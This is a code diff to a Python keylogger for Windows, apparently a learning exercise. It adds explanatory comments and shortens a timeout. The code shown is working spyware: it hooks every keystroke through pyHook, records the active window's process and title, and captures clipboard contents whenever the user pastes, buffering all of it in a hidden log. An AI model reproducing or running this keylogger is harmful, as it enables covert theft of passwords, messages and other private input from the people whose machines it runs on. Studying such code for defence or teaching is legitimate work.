@@ -7,24 +7,25 @@ import sys
 import time
 import win32clipboard
 #128
-TIMEOUT = 30
+TIMEOUT = 10
 
 class KeyLogger:
     def __init__(self):
         self.current_window = None
 
+    #capture currnet process
     def get_current_process(self):
-        hwnd = windll.user32.GetForegroundWindow()
+        hwnd = windll.user32.GetForegroundWindow() # init - return the active window on desktop
         pid = c_ulong(0)
-        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
+        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid)) # getting the pid of the proccess
         process_id = f'{pid.value}'
         executable = create_string_buffer(512)
-        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
+        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid) # get actual name by pid 0x400 - query for informaption / 0x10 - read information
         windll.psapi.GetModuleBaseNameA(
-        h_process, None, byref(executable), 512)
+        h_process, None, byref(executable), 512) 
       
         window_title = create_string_buffer(512)
-        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
+        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512) # get the title bar by getting window text - we create bytes buffer to init it there
         try:
             self.current_window = window_title.value.decode()
         except UnicodeDecodeError as e:
@@ -34,13 +35,13 @@ class KeyLogger:
         windll.kernel32.CloseHandle(h_process)
 
     def mykeystroke(self, event):
-        if event.WindowName != self.current_window:
-            self.get_current_process()
-        if 32 < event.Ascii < 127:
+        if event.WindowName != self.current_window: # check if the user changed windows
+            self.get_current_process() # if yes - get the current window that opened
+        if 32 < event.Ascii < 127: # If the keys that pressed is one of the keyboard keys
             print(chr(event.Ascii), end='')
         else:
-            if event.Key == 'V':
-                win32clipboard.OpenClipboard()
+            if event.Key == 'V':# We check if the user performed CNTRL+V - copy paste action
+                win32clipboard.OpenClipboard() # grab the clipboard
                 value = win32clipboard.GetClipboardData()
                 win32clipboard.CloseClipboard()
                 print(f'[PASTE] - {value}')
@@ -51,12 +52,12 @@ class KeyLogger:
 def run():
     save_stdout = sys.stdout
     sys.stdout = StringIO()
-    kl = KeyLogger()
-    hm = pyHook.HookManager()
-    hm.KeyDown = kl.mykeystroke
-    hm.HookKeyboard()
+    kl = KeyLogger() # create objecet
+    hm = pyHook.HookManager() # define PyWinHook manager
+    hm.KeyDown = kl.mykeystroke 
+    hm.HookKeyboard() # define to get all presses
     while time.thread_time() < TIMEOUT:
-        pythoncom.PumpWaitingMessages()
+        pythoncom.PumpWaitingMessages() # https://www.programcreek.com/python/example/41298/pythoncom.PumpWaitingMessages
     
     log = sys.stdout.getvalue()
     #print(log)
